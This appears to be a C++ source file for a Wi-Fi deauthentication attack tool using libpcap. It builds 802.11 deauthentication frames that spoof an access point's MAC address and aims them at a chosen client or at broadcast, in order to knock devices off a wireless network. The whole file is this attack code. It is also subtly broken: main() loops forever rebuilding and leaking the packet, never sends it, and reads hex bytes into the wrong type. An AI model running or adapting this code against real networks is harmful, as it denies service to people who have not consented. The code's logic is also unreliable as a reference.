#include <pcap.h>
#include <iostream>
#include <string.h>
#include <unistd.h>
#include "channel.h"

using namespace std;

#pragma pack(push, 1)
struct RadiotapHeader {
    uint8_t     h_ver;
    uint8_t     h_pad;
    uint16_t    h_len;
    uint32_t    present;
    uint8_t     data_rate;
    uint8_t     null;
    uint16_t    tx_flag;
};
#pragma pack(pop)

#pragma pack(push, 1)
struct Ie80211Header {
    uint16_t    frame_contrl;
    uint16_t    duration;
    uint8_t     dst_mac[6];
    uint8_t     src_mac[6];
    uint8_t     bss_id[6];
    uint16_t    fragment_num:4;
    uint16_t    sequence_num:12;
    uint16_t    fixed_param;
};
#pragma pack(pop)

class Deauth
{
#define MAC_LEN 6
    uint8_t   ap_mac[MAC_LEN];
    uint8_t   st_mac[MAC_LEN];
    int       attack_type = 0;
    uint8_t   packet_len;
    u_char   *packet;
public:
    Deauth() {}
    ~Deauth() {
        delete []packet;
    }
    void SetMac(char *ap, char *st){
        if(sscanf(ap, "%x:%x:%x:%x:%x:%x",
                  &ap_mac[0],
                  &ap_mac[1],
                  &ap_mac[2],
                  &ap_mac[3],
                  &ap_mac[4],
                  &ap_mac[5]) < MAC_LEN) {
            fprintf(stderr, "could't parse ap mac address %s", ap);
            exit(1);
        }
        if(st == nullptr) {
            memset(st_mac, 0, MAC_LEN);
            attack_type = 1;
        }
        else if(sscanf(st, "%x:%x:%x:%x:%x:%x",
                  &st_mac[0],
                  &st_mac[1],
                  &st_mac[2],
                  &st_mac[3],
                  &st_mac[4],
                  &st_mac[5]) < MAC_LEN) {
            fprintf(stderr, "could't parse station mac address %s", st);
            exit(1);
        }
        else {
            attack_type = 3;
        }
    }
    void PrintMac() {
        printf("Ap %02X:%02X:%02X:%02X:%02X:%02X\n", ap_mac[0], ap_mac[1], ap_mac[2], ap_mac[3], ap_mac[4], ap_mac[5]);
        printf("Station %02X:%02X:%02X:%02X:%02X:%02X\n", st_mac[0], st_mac[1], st_mac[2], st_mac[3], st_mac[4], st_mac[5]);
        printf("Attack Type is : %d\n", attack_type);
    }
    void SetPacket() {
        packet_len = sizeof (RadiotapHeader) + sizeof (Ie80211Header);
        packet = new u_char[packet_len];
        memset(packet, 0x00, packet_len);
        RadiotapHeader *ra_h = reinterpret_cast<RadiotapHeader*>(packet);
        ra_h->h_len = 12;
        ra_h->present = 0x8004;
        ra_h->data_rate = 2;
        ra_h->tx_flag = 24;
        Ie80211Header *ie_h = reinterpret_cast<Ie80211Header*>(packet+ra_h->h_len);
        ie_h->frame_contrl = 0xc0;
        ie_h->duration = 314;
        memcpy(ie_h->src_mac, ap_mac, MAC_LEN);
        memcpy(ie_h->bss_id, ap_mac, MAC_LEN);
        if(attack_type == 3)
            memcpy(ie_h->dst_mac, st_mac, MAC_LEN);
        else
            memset(ie_h->dst_mac, 0xFF, MAC_LEN);
    }
    void SendPacket(pcap_t *handle) {
        printf("send deauth packet \n");
        pcap_sendpacket(handle, reinterpret_cast<const u_char*>(packet), packet_len);
        pcap_sendpacket(handle, reinterpret_cast<const u_char*>(packet), packet_len);
        pcap_sendpacket(handle, reinterpret_cast<const u_char*>(packet), packet_len);
        pcap_sendpacket(handle, reinterpret_cast<const u_char*>(packet), packet_len);
        pcap_sendpacket(handle, reinterpret_cast<const u_char*>(packet), packet_len);
        sleep(1);
    }
};
void Usage() {
    printf("syntax: deauth-attack <interface> <ap mac> [<station mac>]\n");
    printf("sample: deauth-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB\n");
}

int main(int argc, char* argv[]){
    if(argc == 1 || argc > 4) {
        Usage();
        return -1;
    }
    class Deauth deauth;
    char *dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
//    pthread_t p_thread;
//    ChThread ch_thd;

    pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (pcap == nullptr) {
        fprintf(stderr, "pcap_open_live(%s) return null - %s\n", dev, errbuf);
        return -1;
    }

//    GetChannelList(dev, &ch_thd.ch_list);
//    pthread_create(&p_thread, nullptr, ChannelHopping, &ch_thd);

    deauth.SetMac(argv[2], argv[3]);
    deauth.PrintMac();

    while (true) {
        deauth.SetPacket();
    }


    while (true) {
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(pcap, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
            break;
        }

    }
}
